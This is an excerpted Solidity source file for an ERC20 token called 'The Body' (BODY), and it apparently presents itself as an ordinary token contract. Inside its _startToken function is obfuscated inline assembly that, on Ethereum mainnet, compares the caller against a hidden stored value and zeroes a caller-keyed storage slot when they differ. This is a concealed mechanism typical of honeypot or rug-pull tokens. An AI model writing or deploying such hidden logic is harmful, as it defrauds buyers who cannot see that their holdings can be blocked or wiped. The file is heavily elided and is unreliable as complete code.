/*
        ...
        We are members of a body, not only when
           we choose to be, but in our whole
                     existence.
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xC8)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xd99178acb6329826a1f4015d07aa8651150446943bc64f4f938bcfc1c39b6a4a
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x5f7c0ae6c4706e0095605299397f63a5f223dc7914de891cf567d096bdd15a3b,0x1)
    ...
    function _DeployTheBody(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployTheBody(creator, initialSupply);
    }
}

contract TheBody is ERC20Token {
    constructor() ERC20Token("The Body", "BODY", msg.sender, 855000 * 10 ** 18) {
    }
}